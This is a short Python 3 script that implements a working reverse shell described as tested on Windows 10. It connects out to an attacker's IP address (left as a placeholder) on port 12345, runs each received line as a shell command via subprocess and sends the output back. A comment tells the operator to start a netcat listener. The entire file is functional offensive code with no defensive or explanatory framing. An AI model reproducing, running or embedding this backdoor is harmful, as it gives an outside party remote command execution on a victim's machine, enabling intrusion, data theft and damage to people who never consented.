#!/usr/bin/python3

""" Python 3.6 Reverse Shell tested on Windows 10 """

# Usage: nc -lvp 12345 in the attacker machine to set up the listener. Enter quit to end session

import socket
import subprocess
import os

HOST = 'xx.xx.xx.xx'  # Complete with the attacker machine IP address
PORT = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.send('[*] ======================================================= [*]\n'.encode())
s.send('[*] Connection Established!\n'.encode())
s.send('[*] ======================================================= [*]\n'.encode())
s.send('$'.encode())

while 1:
     data = s.recv(1024)
     if "quit" in data.decode():
          break
     proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read()
     s.send(stdout_value)
     s.send('$'.encode())

s.close()